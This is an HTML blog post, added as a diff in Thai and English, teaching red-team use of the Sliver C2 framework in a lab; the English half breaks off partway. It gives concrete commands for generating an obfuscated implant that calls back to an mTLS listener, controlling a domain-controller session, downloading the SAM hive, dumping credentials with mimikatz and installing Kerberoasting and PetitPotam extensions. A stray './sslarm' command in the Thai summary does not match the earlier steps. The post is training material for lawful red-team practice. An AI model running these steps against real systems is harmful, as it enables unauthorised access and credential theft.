@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<script>
+(function(){var s=localStorage.getItem('siteLang');var a=(navigator.language||'').toLowerCase().startsWith('th')?'th':'en';document.documentElement.classList.add('lang-'+(s||a));})();
+</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Sliver C2: เริ่มต้นใช้งานสำหรับ Red Team | Sabastiaz</title>
+<meta content="เรียนรู้การใช้งาน Sliver C2 Framework สำหรับ Red Team ตั้งแต่ติดตั้ง สร้าง Listener สร้าง Implant จนถึงการควบคุม Session พร้อมเปรียบเทียบกับ Metasploit" name="description"/>
+<meta content="Ratthapong Sommanus (Sabastiaz)" name="author"/>
+<meta content="index, follow" name="robots"/>
+<meta content="#1a1008" name="theme-color"/>
+<meta content="Sliver C2: เริ่มต้นใช้งานสำหรับ Red Team | Sabastiaz" property="og:title"/>
+<meta content="เรียนรู้ Sliver C2 ตั้งแต่ศูนย์ - ติดตั้ง สร้าง Listener สร้าง Implant ควบคุม Session และเปรียบเทียบกับ Metasploit" property="og:description"/>
+<meta content="https://sabastiaz.github.io/pic/sliver-1-startup.png" property="og:image"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<link href="../style.css" rel="stylesheet"/>
+<link href="../favicon.ico?v=6" rel="icon" type="image/x-icon"/>
+<link href="../favicon-32.png?v=6" rel="icon" sizes="32x32" type="image/png"/>
+<link href="../favicon-16.png?v=6" rel="icon" sizes="16x16" type="image/png"/>
+<link href="https://sabastiaz.github.io/blog/sliver-c2.html" rel="canonical"/>
+
+<style>
+  .post-back{display:inline-flex;align-items:center;gap:.4rem;font-family:'Cinzel',serif;font-size:.7rem;letter-spacing:.12em;color:var(--text-muted);text-decoration:none;margin-bottom:2rem;transition:color .2s}
+  .post-back:hover{color:var(--gold)}
+  .post-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid rgba(201,168,76,.15)}
+  .post-tags{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1rem}
+  .post-tag{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.08em;padding:.15rem .5rem;border-radius:2px}
+  .tag-en    {color:#6bc5d2;background:rgba(107,197,210,.1);border:1px solid rgba(107,197,210,.22)}
+  .tag-th    {color:#c39bd3;background:rgba(195,155,211,.1);border:1px solid rgba(195,155,211,.22)}
+  .tag-cert  {color:var(--gold2);background:rgba(201,168,76,.1);border:1px solid rgba(201,168,76,.22)}
+  .tag-lab   {color:#5dba6a;background:rgba(93,186,106,.1);border:1px solid rgba(93,186,106,.22)}
+  .tag-pentest{color:#e07b5a;background:rgba(224,123,90,.1);border:1px solid rgba(224,123,90,.22)}
+  .tag-life  {color:#a89bc2;background:rgba(168,155,194,.1);border:1px solid rgba(168,155,194,.22)}
+  .tag-ctf   {color:#63d4af;background:rgba(99,212,175,.1);border:1px solid rgba(99,212,175,.22)}
+  .post-meta-row{display:flex;align-items:center;gap:1.2rem;margin-bottom:1.2rem;font-size:.78rem;color:var(--text-muted)}
+  .post-meta-row .dot{opacity:.3}
+  .post-title{font-family:'Cinzel',serif;font-size:clamp(1.3rem,4vw,2rem);font-weight:700;color:var(--text);line-height:1.35;margin:0}
+  .post-body{max-width:740px;line-height:1.9;color:var(--text-muted);font-size:.97rem}
+  .post-body h2{font-family:'Cinzel',serif;font-size:1.05rem;font-weight:600;color:var(--gold);margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:1px solid rgba(201,168,76,.15)}
+  .post-body h3{font-family:'Cinzel',serif;font-size:.88rem;font-weight:600;color:var(--text);margin:1.8rem 0 .8rem}
+  .post-body h4{font-family:'Cinzel',serif;font-size:.8rem;font-weight:600;color:var(--text-muted);margin:1.4rem 0 .6rem}
+  .post-body p{margin:0 0 1.2rem}
+  .post-body ul,.post-body ol{padding-left:1.5rem;margin:0 0 1.2rem}
+  .post-body li{margin-bottom:.4rem}
+  .post-body strong{color:var(--text)}
+  .post-body em{font-style:italic;color:var(--text-muted)}
+  .post-body code{font-family:'Courier New',monospace;font-size:.84rem;background:rgba(201,168,76,.07);border:1px solid rgba(201,168,76,.15);padding:.1rem .35rem;border-radius:3px;color:var(--gold2)}
+  .post-body pre{background:rgba(0,0,0,.45);border:1px solid rgba(201,168,76,.15);border-radius:4px;padding:1.2rem 1.4rem;overflow-x:auto;margin:0 0 1.5rem}
+  .post-body pre code{background:none;border:none;padding:0;font-size:.82rem;line-height:1.45;color:#c9c9c9}
+  .post-body table{width:100%;border-collapse:collapse;margin:0 0 1.5rem;font-size:.88rem}
+  .post-body th{font-family:'Cinzel',serif;font-size:.68rem;letter-spacing:.08em;color:var(--gold);text-align:left;padding:.6rem 1rem;border-bottom:1px solid rgba(201,168,76,.25)}
+  .post-body td{padding:.5rem 1rem;border-bottom:1px solid rgba(201,168,76,.08)}
+  .post-body blockquote{border-left:3px solid var(--gold);padding:.8rem 1.4rem;margin:0 0 1.5rem;background:rgba(201,168,76,.04);border-radius:0 4px 4px 0;font-style:italic}
+  .post-body a{color:var(--gold);text-decoration:none}
+  .post-body a:hover{text-decoration:underline}
+  .post-body figure{margin:1.5rem 0 2rem;text-align:center}
+  .post-body figure img{max-width:100%;border-radius:6px;border:1px solid rgba(201,168,76,.12)}
+  .post-body figcaption{font-size:.75rem;color:var(--text-muted);margin-top:.5rem;font-style:italic}
+  .post-body hr{border:none;border-top:1px solid rgba(201,168,76,.15);margin:2rem 0}
+  .post-footer{margin-top:4rem;padding-top:2.5rem;border-top:1px solid rgba(201,168,76,.15);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.5rem}
+  .author-card{display:flex;align-items:center;gap:1rem}
+  .author-avatar{width:48px;height:48px;border-radius:50%;object-fit:cover;border:2px solid rgba(201,168,76,.3)}
+  .author-name{font-family:'Cinzel',serif;font-size:.85rem;font-weight:600;color:var(--text)}
+  .author-creds{font-size:.7rem;color:var(--text-muted);margin-top:.2rem}
+  .share-section{margin-top:3rem;padding:1.5rem 0;border-top:1px solid rgba(201,168,76,.1)}
+  .share-label{font-family:'Cinzel',serif;font-size:.75rem;color:var(--text-muted);letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.9rem}
+  .share-buttons{display:flex;gap:.6rem;flex-wrap:wrap}
+  .share-btn{display:inline-flex;align-items:center;gap:.45rem;padding:.45rem .9rem;border-radius:4px;font-size:.75rem;font-family:'Cinzel',serif;text-decoration:none;cursor:pointer;border:1px solid rgba(201,168,76,.25);background:rgba(201,168,76,.04);color:var(--text-muted);transition:border-color .2s,color .2s,background .2s}
+  .share-btn:hover{border-color:var(--gold);color:var(--gold);background:rgba(201,168,76,.08)}
+  .share-btn svg{flex-shrink:0}
+  .lb[lang="en"]{display:none}
+  html.lang-en .lb[lang="th"]{display:none}
+  html.lang-en .lb[lang="en"]{display:block}
+  .lang-pill{display:inline-flex;border:1px solid rgba(201,168,76,.3);border-radius:20px;overflow:hidden;font-family:'Cinzel',serif;font-size:.65rem;letter-spacing:.08em}
+  .lang-pill a{padding:.28rem .6rem;text-decoration:none;color:var(--text-muted);transition:color .15s,background .15s;line-height:1}
+  .lang-pill a.active{background:rgba(201,168,76,.18);color:var(--gold);pointer-events:none}
+  .lang-pill a:not(.active):hover{background:rgba(201,168,76,.08);color:var(--text)}
+
+  .post-navlinks{display:flex;justify-content:space-between;gap:1rem;margin-top:1.5rem;flex-wrap:wrap}
+  .post-navlink{flex:1;min-width:200px;background:var(--surface2);border:1px solid rgba(201,168,76,.13);border-radius:4px;padding:1rem 1.2rem;text-decoration:none;transition:all .25s;display:flex;flex-direction:column;gap:.3rem}
+  .post-navlink:hover{border-color:rgba(201,168,76,.4);transform:translateY(-2px)}
+  .post-navlink.next{text-align:right;align-items:flex-end}
+  .post-navlink-label{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:var(--text-muted)}
+  .post-navlink-title{font-size:.85rem;color:var(--gold2);line-height:1.4}
+
+  .toc-toggle{position:fixed;top:6rem;left:1.25rem;z-index:850;width:2.4rem;height:2.4rem;border-radius:50%;background:rgba(12,10,8,.85);border:1px solid rgba(201,168,76,.3);color:var(--gold);font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px);transition:border-color .2s}
+  .toc-toggle:hover{border-color:var(--gold)}
+  .toc-panel{position:fixed;top:9.5rem;left:1.25rem;z-index:849;width:240px;max-height:60vh;overflow-y:auto;background:rgba(12,10,8,.95);border:1px solid rgba(201,168,76,.25);border-radius:6px;padding:1rem;display:none;backdrop-filter:blur(6px)}
+  .toc-panel.open{display:block}
+  .toc-panel-label{font-family:'Cinzel',serif;font-size:.6rem;letter-spacing:.14em;text-transform:uppercase;color:var(--gold);opacity:.7;margin-bottom:.6rem}
+  .toc-list{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:.4rem}
+  .toc-list a{font-size:.78rem;color:var(--text-muted);text-decoration:none;line-height:1.4;transition:color .15s;display:block}
+  .toc-list a:hover{color:var(--gold)}
+  @media (max-width:1100px){.toc-toggle,.toc-panel{display:none}}
+</style>
+</head>
+<body>
+<canvas id="stars-canvas"></canvas>
+<nav>
+<a class="nav-logo" href="../index.html">Sabastiaz 🪄</a>
+<ul class="nav-links">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../about.html">About</a></li>
+<li><a href="../skills.html">Spells</a></li>
+<li><a href="../tools.html">Arsenal</a></li>
+<li><a class="active" href="../writings.html">Tomes</a></li>
+<li><a href="../honor.html">Honours</a></li>
+<li><a href="../wowza.html">Wowza</a></li>
+<li><a href="../event.html">Events</a></li>
+<li><a href="../changelog.html">Updates</a></li>
+<li><a href="../contact.html">Owl Post</a></li>
+<li><a href="../cocacola.html">🥤</a></li>
+</ul>
+<div class="lang-pill" id="lang-pill">
+<a class="lang-th" href="#">TH</a>
+<a class="lang-en" href="#">EN</a>
+</div>
+<button aria-expanded="false" aria-label="Menu" class="nav-hamburger" id="nav-hamburger"><span></span><span></span><span></span></button>
+</nav>
+<button class="toc-toggle" id="toc-toggle" aria-label="Table of contents">📜</button>
+<div class="toc-panel" id="toc-panel">
+  <div class="toc-panel-label">✦ Table of Contents ✦</div>
+  <ul class="toc-list" id="toc-list"></ul>
+</div>
+
+<div class="page">
+<div class="content">
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+<div class="post-header">
+<div class="post-tags">
+<span class="post-tag tag-th">TH</span>
+<span class="post-tag tag-pentest">Red Team</span>
+<span class="post-tag tag-lab">Tool</span>
+</div>
+<div class="post-meta-row">
+<span>June 27, 2026</span><span class="dot">✦</span><span>15 min read</span>
+</div>
+<h1 class="post-title">
+<span class="lb" lang="th">Sliver C2: เริ่มต้นใช้งานสำหรับ Red Team</span>
+<span class="lb" lang="en">Sliver C2: Getting Started for Red Team</span>
+</h1>
+</div>
+
+<div class="post-body lb" lang="th">
+<p>หากพูดถึงเครื่องมือที่ใช้ในการทำ Penetration Testing หรือ Red Team หลายคนคงนึกถึง <strong>Metasploit Framework</strong> เป็นอันดับแรก เพราะเป็น Framework ที่ได้รับความนิยมมายาวนานและมี Exploit Module จำนวนมหาศาล</p>
+<p>แต่ในช่วงหลายปีที่ผ่านมา ได้มีเครื่องมือ Command &amp; Control (C2) รุ่นใหม่เกิดขึ้นจำนวนมาก หนึ่งในนั้นคือ <strong>Sliver C2</strong> ซึ่งพัฒนาโดย Bishop Fox</p>
+<p>Sliver ถูกออกแบบมาเพื่อใช้ในการทำ Red Team และ Adversary Simulation โดยเฉพาะ มีจุดเด่นคือ</p>
+<ul>
+<li>เขียนด้วยภาษา <strong>Go</strong></li>
+<li>รองรับหลาย Platform</li>
+<li>มี Implant ขนาดเล็ก</li>
+<li>รองรับ HTTP, HTTPS, mTLS, DNS และ WireGuard</li>
+<li>OPSEC ดีกว่า Framework รุ่นเก่า</li>
+<li>ใช้งานฟรีและเป็น Open Source</li>
+</ul>
+<p>ในบทความนี้ เราจะพาไปรู้จัก Sliver ตั้งแต่เริ่มต้น พร้อมเปรียบเทียบกับ Metasploit และสร้าง Lab สำหรับทดลองใช้งานจริง</p>
+
+<h2>Sliver C2 คืออะไร</h2>
+<p>Sliver คือ <strong>Command and Control Framework (C2)</strong> ที่ใช้สำหรับควบคุมเครื่องเป้าหมายหลังจากสามารถเข้าถึงระบบได้แล้ว (Post-Exploitation)</p>
+<p>หน้าที่หลักของ Sliver ได้แก่</p>
+<ul>
+<li>สร้าง Implant</li>
+<li>รับ Beacon จากเครื่องเป้าหมาย</li>
+<li>รันคำสั่ง</li>
+<li>Upload / Download ไฟล์</li>
+<li>Screenshot</li>
+<li>Port Forwarding</li>
+<li>Pivot</li>
+<li>Execute Assembly</li>
+<li>Process Injection</li>
+<li>Extension ผ่าน Armory</li>
+</ul>
+<p>กล่าวง่าย ๆ คือ Sliver ทำหน้าที่เป็น "ศูนย์กลาง" สำหรับควบคุมเครื่องที่เราสามารถเข้าถึงได้แล้ว</p>
+
+<h2>Sliver ทำงานอย่างไร</h2>
+<p>ภาพรวมการทำงานสามารถอธิบายได้ดังนี้</p>
+<pre><code>Operator
+  ↓
+Sliver Server
+  ↓
+Listener (HTTPS / mTLS)
+  ↓
+Implant
+  ↓
+Target Machine</code></pre>
+<p>เมื่อ Implant ถูกรันบนเครื่องเป้าหมาย มันจะเชื่อมต่อกลับมายัง Listener ที่เราสร้างไว้ จากนั้น Operator สามารถส่งคำสั่งผ่าน Sliver Server ไปยังเครื่องเป้าหมายได้</p>
+<figure>
+<img alt="Sliver Server Startup" loading="lazy" src="../pic/sliver-1-startup.png"/>
+<figcaption>หน้าแรกของ Sliver Server - Sliver v1.7.3</figcaption>
+</figure>
+
+<h2>Sliver vs Metasploit</h2>
+<p>หลายคนเข้าใจว่า Sliver คือคู่แข่งของ Metasploit แต่จริง ๆ แล้วทั้งสองตัวมีหน้าที่แตกต่างกัน</p>
+<table>
+<thead>
+<tr><th>เปรียบเทียบ</th><th>Sliver</th><th>Metasploit</th></tr>
+</thead>
+<tbody>
+<tr><td>จุดประสงค์หลัก</td><td>Command &amp; Control</td><td>Exploitation Framework</td></tr>
+<tr><td>ภาษา</td><td>Go</td><td>Ruby</td></tr>
+<tr><td>Exploit Module</td><td>มีน้อย</td><td>มีจำนวนมาก</td></tr>
+<tr><td>Payload</td><td>Modern Implant</td><td>Meterpreter</td></tr>
+<tr><td>OPSEC</td><td>ดี</td><td>ปานกลาง</td></tr>
+<tr><td>Beacon</td><td>รองรับ</td><td>จำกัด</td></tr>
+<tr><td>Extension</td><td>Armory</td><td>Post Modules</td></tr>
+<tr><td>Performance</td><td>สูง</td><td>ปานกลาง</td></tr>
+</tbody>
+</table>
+<h3>Metasploit เหมาะกับ</h3>
+<ul>
+<li>Exploit CVE</li>
+<li>Validate Vulnerability</li>
+<li>Privilege Escalation</li>
+<li>Meterpreter</li>
+</ul>
+<h3>Sliver เหมาะกับ</h3>
+<ul>
+<li>Long-term Engagement</li>
+<li>Red Team</li>
+<li>Beacon Management</li>
+<li>Command &amp; Control</li>
+</ul>
+<p>ในโลกจริง ทั้งสอง Framework มักถูกใช้งานร่วมกัน เช่น ใช้ Metasploit สำหรับ Initial Access และเปลี่ยนมาใช้ Sliver เพื่อควบคุมเครื่องในระยะยาว</p>
+
+<h2>เตรียม Lab</h2>
+<p>ก่อนเริ่มใช้งาน เราควรมี Lab สำหรับทดลอง</p>
+<ul>
+<li><strong>Kali Linux</strong> - Operator Machine</li>
+<li><strong>Windows 10 / Windows Server</strong> - Target Machine</li>
+<li><strong>Active Directory</strong> (Optional) - สำหรับทดสอบ AD Attack</li>
+<li><strong>Ubuntu Server</strong> (Optional) - สำหรับ Linux Target</li>
+</ul>
+<p>แนะนำให้ทุกเครื่องอยู่ใน Virtual Network เดียวกัน เพื่อให้ทดลองได้สะดวก</p>
+<blockquote>💡 สามารถใช้ HTB Labs, TryHackMe หรือ VirtualBox/VMware ในการสร้าง Lab ส่วนตัวได้</blockquote>
+
+<h2>ติดตั้ง Sliver</h2>
+<p>ดาวน์โหลด Sliver จาก GitHub Releases และติดตั้งบน Kali Linux</p>
+<pre><code># ดาวน์โหลด Sliver server binary
+curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -o sliver-server
+chmod +x sliver-server
+
+# รัน Sliver server
+./sliver-server</code></pre>
+<p>หรือถ้ามี script installer:</p>
+<pre><code>curl -sSL https://sliver.sh/install | sudo bash</code></pre>
+<figure>
+<img alt="Sliver Server Banner" loading="lazy" src="../pic/sliver-1-startup.png"/>
+<figcaption>Sliver v1.7.3 server เริ่มต้นพร้อมใช้งาน</figcaption>
+</figure>
+
+<h2>เริ่มต้นใช้งาน - Create Listener</h2>
+<p>หลังจากติดตั้งและรัน Sliver Server แล้ว ขั้นตอนแรกคือสร้าง <strong>Listener</strong> เพื่อรับการเชื่อมต่อจาก Implant</p>
+<p>Sliver รองรับหลายโปรโตคอล</p>
+<ul>
+<li><strong>HTTP / HTTPS</strong> - เหมาะกับสภาพแวดล้อมที่ Firewall อนุญาต outbound HTTP/S</li>
+<li><strong>mTLS</strong> - Mutual TLS มีความปลอดภัยสูง เหมาะกับ Lab และ Internal Network</li>
+<li><strong>DNS</strong> - ช้าแต่หลบ Firewall ได้ดี</li>
+<li><strong>WireGuard</strong> - VPN-based C2</li>
+</ul>
+<p>ตัวอย่างการสร้าง mTLS Listener:</p>
+<pre><code>[server] sliver &gt; mtls --lhost 10.10.15.5 --lport 4444
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1</code></pre>
+<figure>
+<img alt="Create mTLS Listener and Generate Implant" loading="lazy" src="../pic/sliver-2-listener.png"/>
+<figcaption>สร้าง mTLS Listener บน 10.10.15.5:4444</figcaption>
+</figure>
+
+<h2>สร้าง Implant</h2>
+<p>Sliver มี Implant สองแบบหลัก ๆ</p>
+<ul>
+<li><strong>Session</strong> - เชื่อมต่อแบบ Interactive real-time เหมาะกับการทดสอบสั้น ๆ</li>
+<li><strong>Beacon</strong> - เชื่อมต่อเป็น interval (sleep และ check-in) เหมาะกับ Long-term engagement และ OPSEC ดีกว่า</li>
+</ul>
+<p>ตัวอย่างการสร้าง Session Implant สำหรับ Windows x64:</p>
+<pre><code>[server] sliver &gt; generate --mtls 10.10.15.5:4444 --os windows --arch amd64
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 43s
+[*] Implant saved to /home/sabastiaz/Tools/silver/Server/RAW_CAMPANILE.exe</code></pre>
+<p>Sliver จะสุ่มชื่อ Implant ให้อัตโนมัติ (เช่น <code>RAW_CAMPANILE</code>) และเปิด Symbol Obfuscation โดย default เพื่อลดการตรวจจับ</p>
+<h3>ตัวเลือกที่ควรรู้</h3>
+<table>
+<thead>
+<tr><th>Flag</th><th>ความหมาย</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--mtls</code></td><td>ใช้โปรโตคอล mTLS</td></tr>
+<tr><td><code>--os windows</code></td><td>Target OS</td></tr>
+<tr><td><code>--arch amd64</code></td><td>Target Architecture</td></tr>
+<tr><td><code>--beacon</code></td><td>สร้างเป็น Beacon แทน Session</td></tr>
+<tr><td><code>--sleep 30</code></td><td>Beacon interval (วินาที)</td></tr>
+<tr><td><code>--format shellcode</code></td><td>Output เป็น shellcode</td></tr>
+</tbody>
+</table>
+
+<h2>เครื่องเป้าหมายเชื่อมต่อกลับ</h2>
+<p>เมื่อรัน Implant บนเครื่องเป้าหมายแล้ว Sliver Server จะแจ้งเตือนทันที</p>
+<pre><code>[*] Session e086f581 RAW_CAMPANILE - 10.129.29.250:52651 (dc) - windows/amd64 - Sat, 27 Jun 2026 17:53:43 +07</code></pre>
+<p>ดู session ทั้งหมดด้วย <code>sessions</code> แล้ว interact กับ session ด้วย <code>use</code></p>
+<pre><code>[server] sliver &gt; sessions
+
+ID        Name          Transport  Remote Address       Hostname  Username            Process (PID)                                 Integrity  OS            Locale
+========  ============  =========  ===================  ========  ==================  ============================================  =========  ============  ======
+e086f581  RAW_CAMPANILE mtls       10.129.29.250:52651  dc        SUPPORT\Administrator  C:\Users\Administrator\Documents\r.exe (3568)  -          windows/amd64  en-US
+
+[server] sliver &gt; use e086f581</code></pre>
+<figure>
+<img alt="Session Connected" loading="lazy" src="../pic/sliver-3-session.png"/>
+<figcaption>Session ของ RAW_CAMPANILE เชื่อมต่อจาก dc (SUPPORT\Administrator) - ALIVE</figcaption>
+</figure>
+<p>ข้อมูลที่ Sliver แสดงให้เห็น</p>
+<ul>
+<li><strong>ID</strong> - Session ID สำหรับ interact</li>
+<li><strong>Name</strong> - ชื่อ Implant (random)</li>
+<li><strong>Remote Address</strong> - IP ของ Target</li>
+<li><strong>Hostname</strong> - ชื่อ Host</li>
+<li><strong>Username</strong> - User ที่ Implant รันอยู่</li>
+<li><strong>Process (PID)</strong> - Process ที่ Implant ซ่อนอยู่</li>
+</ul>
+
+<h2>การใช้งานพื้นฐาน</h2>
+<p>หลังจาก <code>use &lt;session-id&gt;</code> แล้ว จะเข้าสู่ interactive session กับเครื่องเป้าหมาย</p>
+<pre><code># ดูข้อมูลระบบ
+[server] sliver (RAW_CAMPANILE) &gt; info
+
+# รัน shell command
+[server] sliver (RAW_CAMPANILE) &gt; shell
+
+# อัปโหลดไฟล์
+[server] sliver (RAW_CAMPANILE) &gt; upload /local/file.exe C:\remote\file.exe
+
+# ดาวน์โหลดไฟล์
+[server] sliver (RAW_CAMPANILE) &gt; download C:\Windows\System32\SAM /tmp/SAM
+
+# Screenshot
+[server] sliver (RAW_CAMPANILE) &gt; screenshot
+
+# ดู Process
+[server] sliver (RAW_CAMPANILE) &gt; ps</code></pre>
+<h3>Armory - Extension Manager</h3>
+<p>หนึ่งในจุดเด่นของ Sliver คือ <strong>Armory</strong> ซึ่งเป็น Extension Manager ที่ช่วยให้เราติดตั้ง BOF (Beacon Object File) และ Extension ต่าง ๆ ได้ง่าย</p>
+<pre><code>[server] sliver &gt; armory</code></pre>
+<figure>
+<img alt="Sliver Armory" loading="lazy" src="../pic/sliver-4-armory.png"/>
+<figcaption>Armory packages - BOF tools และ C2TC extensions พร้อมใช้งาน</figcaption>
+</figure>
+<p>Extension ที่น่าสนใจจาก Armory</p>
+<ul>
+<li><code>bof-roast</code> - Kerberoasting ผ่าน BOF</li>
+<li><code>c2tc-kerberoast</code> - Kerberoast สำหรับ AD</li>
+<li><code>c2tc-lapsdump</code> - Dump LAPS passwords</li>
+<li><code>c2tc-addmachineaccount</code> - Add Machine Account ใน AD</li>
+<li><code>c2tc-petitpotam</code> - PetitPotam coercion</li>
+<li><code>c2tc-domaininfo</code> - Enumerate AD information</li>
+</ul>
+<p>ติดตั้ง Extension ด้วย</p>
+<pre><code>[server] sliver &gt; armory install bof-roast</code></pre>
+
+<h2>Workflow จริงของ Red Team</h2>
+<p>ตัวอย่าง Workflow ที่ใช้ Sliver ร่วมกับ Metasploit ในการปฏิบัติการจริง</p>
+<pre><code>Initial Access
+  ↓
+Metasploit (Exploit / CVE)
+  ↓
+Meterpreter Session
+  ↓
+Execute Sliver Implant
+  ↓
+Beacon / Session
+  ↓
+Credential Dump
+  ↓
+Lateral Movement
+  ↓
+Persistence
+  ↓
+Collection
+  ↓
+Cleanup</code></pre>
+<p>ตัวอย่าง Credential Dumping ผ่าน Sliver โดยใช้ <strong>Mimikatz</strong> extension</p>
+<pre><code>[server] sliver (RAW_CAMPANILE) &gt; mimikatz sekurlsa::logonpasswords</code></pre>
+<figure>
+<img alt="Mimikatz Credential Dump via Sliver" loading="lazy" src="../pic/sliver-5-mimikatz.png"/>
+<figcaption>ผลลัพธ์จาก mimikatz sekurlsa::logonpasswords - ดึง NTLM hash ของ DC$ machine account</figcaption>
+</figure>
+<p>จากตัวอย่าง เราสามารถดึง NTLM Hash ของ Machine Account ได้ ซึ่งสามารถนำไปใช้ต่อใน Pass-the-Hash หรือ Silver Ticket Attack</p>
+<blockquote>จะเห็นว่า Sliver ไม่ได้มาแทน Metasploit แต่ช่วยเสริมการทำงานในช่วง Post-Exploitation ให้มีความยืดหยุ่นและเหมาะกับการปฏิบัติการระยะยาวมากขึ้น</blockquote>
+
+<h2>สรุป</h2>
+<p>จากที่เราเริ่มต้นด้วยการรัน <code>./sslarm</code> สร้าง Listener ด้วย <code>mtls</code> Generate Implant จนกระทั่ง Session ขึ้นมาเป็น <strong>ALIVE</strong> แล้ว Dump Credentials ออกมาได้ - นี่คือ Flow ทั้งหมดที่ Sliver ทำหน้าที่ได้จริงในสนามงาน Red Team</p>
+<p>Sliver ไม่ได้มาแทน Metasploit แต่มันทำในส่วนที่ Metasploit ทำได้ไม่ดีนัก นั่นคือการ <strong>ควบคุมเครื่องในระยะยาว</strong> ด้วย OPSEC ที่ดีขึ้น Beacon ที่ยืดหยุ่น และ Extension ผ่าน Armory ที่ครอบคลุม AD Attack ได้เกือบทุกรูปแบบ</p>
+<p>ถ้าคุณเคยใช้แค่ Metasploit + Meterpreter มาตลอด ลองหยิบ Sliver มาเปิดดูสักครั้ง - มันไม่ได้ซับซ้อนอย่างที่คิด และ Workflow มันเหมาะกับ Engagement จริงมากกว่าที่คุณเคยเจอมา</p>
+
+</div>
+
+<div class="post-body lb" lang="en">
+<p>When it comes to tools used in Penetration Testing or Red Team operations, most people immediately think of <strong>Metasploit Framework</strong> - a long-standing, widely popular framework with an enormous library of exploit modules.</p>
+<p>In recent years, however, a new generation of Command &amp; Control (C2) tools has emerged. One of them is <strong>Sliver C2</strong>, developed by Bishop Fox.</p>
+<p>Sliver was purpose-built for Red Team operations and Adversary Simulation. Its key strengths include:</p>
+<ul>
+<li>Written in <strong>Go</strong></li>
+<li>Cross-platform support</li>
+<li>Small implant footprint</li>
+<li>Supports HTTP, HTTPS, mTLS, DNS, and WireGuard</li>
+<li>Better OPSEC than legacy frameworks</li>
+<li>Free and Open Source</li>
+</ul>
+<p>In this post, we'll explore Sliver from the ground up, compare it against Metasploit, and build a lab to try it hands-on.</p>
+
+<h2>What Is Sliver C2?</h2>
+<p>Sliver is a <strong>Command and Control Framework (C2)</strong> used to control target machines after initial access has been achieved (Post-Exploitation).</p>
+<p>Core capabilities of Sliver include:</p>
+<ul>
+<li>Generate implants</li>
+<li>Receive beacons from targets</li>
+<li>Execute commands</li>
+<li>Upload / Download files</li>
+<li>Screenshot</li>
+<li>Port Forwarding</li>
+<li>Pivot</li>
+<li>Execute Assembly (.NET)</li>
+<li>Process Injection</li>
+<li>Extensions via Armory</li>
+</ul>
+<p>Simply put, Sliver acts as a "command center" for controlling machines you've already gained access to.</p>
+
+<h2>How Sliver Works</h2>
+<p>The overall architecture looks like this:</p>
+<pre><code>Operator
+  ↓
+Sliver Server
+  ↓
+Listener (HTTPS / mTLS)
+  ↓
+Implant
+  ↓
+Target Machine</code></pre>
+<p>Once an implant runs on the target machine, it connects back to your listener. The operator can then send commands through the Sliver Server to the target.</p>
+<figure>
+<img alt="Sliver Server Startup" loading="lazy" src="../pic/sliver-1-startup.png"/>
+<figcaption>Sliver Server first launch - Sliver v1.7.3</figcaption>
+</figure>
+
+<h2>Sliver vs Metasploit</h2>
+<p>Many people assume Sliver competes directly with Metasploit. In reality, they serve different purposes.</p>
+<table>
+<thead>
+<tr><th>Comparison</th><th>Sliver</th><th>Metasploit</th></tr>
+</thead>
+<tbody>
+<tr><td>Primary Purpose</td><td>Command &amp; Control</td><td>Exploitation Framework</td></tr>
+<tr><td>Language</td><td>Go</td><td>Ruby</td></tr>
+<tr><td>Exploit Modules</td><td>Minimal</td><td>Extensive</td></tr>
+<tr><td>Payload</td><td>Modern Implant</td><td>Meterpreter</td></tr>
+<tr><td>OPSEC</td><td>Good</td><td>Moderate</td></tr>
+<tr><td>Beacon</td><td>Full support</td><td>Limited</td></tr>
+<tr><td>Extensions</td><td>Armory</td><td>Post Modules</td></tr>
+<tr><td>Performance</td><td>High</td><td>Moderate</td></tr>
+</tbody>
+</table>
+<h3>Metasploit is best for</h3>
+<ul>
+<li>Exploiting CVEs</li>
+<li>Validating Vulnerabilities</li>
+<li>Privilege Escalation</li>
+<li>Meterpreter sessions</li>
+</ul>
+<h3>Sliver is best for</h3>
+<ul>
+<li>Long-term Engagements</li>
+<li>Red Team Operations</li>
+<li>Beacon Management</li>
+<li>Command &amp; Control</li>
+</ul>
+<p>In practice, both frameworks are often used together - Metasploit for initial exploitation, Sliver for long-term post-exploitation control.</p>
+
+<h2>Setting Up a Lab</h2>
+<p>Before you begin, prepare a lab environment:</p>
+<ul>
+<li><strong>Kali Linux</strong> - Operator Machine</li>
+<li><strong>Windows 10 / Windows Server</strong> - Target Machine</li>
+<li><strong>Active Directory</strong> (Optional) - for AD attack testing</li>
+<li><strong>Ubuntu Server</strong> (Optional) - for Linux targets</li>
+</ul>
+<p>All machines should be on the same virtual network for easy connectivity.</p>
+<blockquote>💡 You can use HTB Labs, TryHackMe, or VirtualBox/VMware to build a private lab.</blockquote>
+
+<h2>Installing Sliver</h2>
+<p>Download Sliver from GitHub Releases and install on Kali Linux:</p>
+<pre><code># Download Sliver server binary
+curl -L https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -o sliver-server
+chmod +x sliver-server
+
+# Run Sliver server
+./sliver-server</code></pre>
+<p>Or use the installer script:</p>
+<pre><code>curl -sSL https://sliver.sh/install | sudo bash</code></pre>
+<figure>
+<img alt="Sliver Server Banner" loading="lazy" src="../pic/sliver-1-startup.png"/>
+<figcaption>Sliver v1.7.3 server ready</figcaption>
+</figure>
+
+<h2>Getting Started - Create a Listener</h2>
+<p>After launching Sliver Server, the first step is creating a <strong>Listener</strong> to receive connections from your implant.</p>
